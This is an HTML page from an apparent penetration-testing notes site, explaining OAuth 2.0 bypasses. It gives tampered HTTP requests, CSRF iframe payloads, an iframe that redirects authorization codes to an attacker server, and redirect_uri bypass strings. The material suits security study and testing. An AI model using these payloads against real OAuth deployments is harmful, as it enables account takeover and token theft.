@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>OAuth 2.0 Bypass | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="OAuth 2.0 Bypass" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/web/oauth-2.0-bypass/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/web/oauth-2.0-bypass/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"Introduction","url":"http://0.0.0.0:4000/hackingnotes/web/oauth-2.0-bypass/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"OAuth 2.0 Bypass","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Web</h2>
+				<h3>OAuth 2.0 Bypass</h3>
+			</div>
+			<article class="content">
+				<h1 id="introduction">Introduction</h1>
+
+<p>OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user’s account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application.</p>
+
+<h1 id="vulnerabilities-in-the-oauth-client-application">Vulnerabilities in the OAuth client application</h1>
+
+<p>Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.</p>
+
+<h2 id="improper-implementation-of-the-implicit-grant-type"><strong>Improper implementation of the implicit grant type</strong></h2>
+
+<p>Once the OAuth 2.0 flow is completed and the token is assigned, the information is sent to the application (username, email and the token). We can bypass the authentication by changing the email and username of the request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Original Request
+
+POST /authenticate HTTP/1.1
+Host: oauth-test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https:/oauth-test.com/oauth-callback
+Content-Type: application/json
+Origin: https://app-test.com
+Content-Length: 103
+Connection: close
+Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn
+
+
+{
+    "email":"user@test.com",
+    "username":"user",
+    "token":"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi"
+}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Edited Request
+
+POST /authenticate HTTP/1.1
+Host: oauth-test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https:/oauth-test.com/oauth-callback
+Content-Type: application/json
+Origin: https://app-test.com
+Content-Length: 103
+Connection: close
+Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn
+
+
+{
+    "email":"another@test.com",
+    "username":"another",
+    "token":"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi"
+}
+</code></pre></div></div>
+
+<h2 id="flawed-csrf-protection-no-state-parameter"><strong>Flawed CSRF protection (no state parameter)</strong></h2>
+
+<p>Although many components of the OAuth flows are optional, some of them are strongly recommended unless there’s an important reason not to use them. One such example is the <code class="highlighter-rouge">state</code> parameter.</p>
+
+<p>The <code class="highlighter-rouge">state</code> parameter should ideally contain an unguessable value, such as the hash of something tied to the user’s session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of <a href="https://portswigger.net/web-security/csrf/tokens">CSRF token</a> for the client application.</p>
+
+<p>Since this state parameter is not available in the request we can link our profile media to an existing account by exploiting a CSRF attack:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># CSRF vulnerable request
+
+GET /oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv HTTP/1.1
+Host: app.test.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://exploit.test.com/exploit
+Cookie: session=4UxlhSNG2r19csEDsUySJwHtVPSyE4eE
+Upgrade-Insecure-Requests: 1
+
+</code></pre></div></div>
+
+<p>Payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># index.html
+
+&lt;iframe src="https://app.test.com/oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv"&gt;
+&lt;/iframe&gt;
+</code></pre></div></div>
+
+<h2 id="leaking-authorization-codes-and-access-tokens">Leaking authorization codes and access tokens</h2>
+
+<p>Depending on the grant type, either a code or token is sent via the victim’s browser to the <code class="highlighter-rouge">/callback</code> endpoint specified in the <code class="highlighter-rouge">redirect_uri</code> parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim’s browser into initiating an OAuth flow that will send the code or token to an attacker-controlled <code class="highlighter-rouge">redirect_uri</code>.</p>
+
+<p>In the case of the authorization code flow, an attacker can potentially steal the victim’s code before it is used. They can then send this code to the client application’s legitimate <code class="highlighter-rouge">/callback</code> endpoint (the original <code class="highlighter-rouge">redirect_uri</code>) to get access to the user’s account.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># CSRF Vulnerable Request
+# Modify the redirect_uri to a coontrolled server
+
+GET /auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https://myserver.com/evil&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/1.1
+Host: oauth-server.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: _session=7rn_lI1PoVH0bMKi3_Cmq; _session.legacy=7rn_lI1PoVH0bMKi3_Cmq
+Upgrade-Insecure-Requests: 1
+</code></pre></div></div>
+
+<p>Payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#index.html
+
+&lt;iframe src="https://oauth-server.example.com/auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https://myserver.com/evil&amp;response_type=code&amp;scope=openid%20profile%20email"&gt;
+&lt;/iframe&gt;
+</code></pre></div></div>
+
+<h1 id="pentesting-oauth-20"><strong>Pentesting OAuth 2.0</strong></h1>
+
+<h2 id="redirect_uri-validation"><strong>redirect_uri validation</strong></h2>
+
+<p><code class="highlighter-rouge">redirect_uri</code> parameter should be validated via white list, but sometimes is misconfigured and leads to flaws and vulnerabilities. Things to check:</p>
+
+<ul>
+  <li>Try to remove or add arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.</li>
+  <li>Try to append extra values to the default <code class="highlighter-rouge">redirect_uri</code> parameter: <code class="highlighter-rouge">https://example.com &amp;@foo.evil.com#@bar.evil.com/</code> .</li>
+  <li>Try duplicate <code class="highlighter-rouge">redirect_uri</code> parameter.</li>
+  <li>Begin with <code class="highlighter-rouge">localhost</code> : <code class="highlighter-rouge">http://localhost.evil.com/</code>.</li>
+</ul>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/oauth">https://portswigger.net/web-security/oauth</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
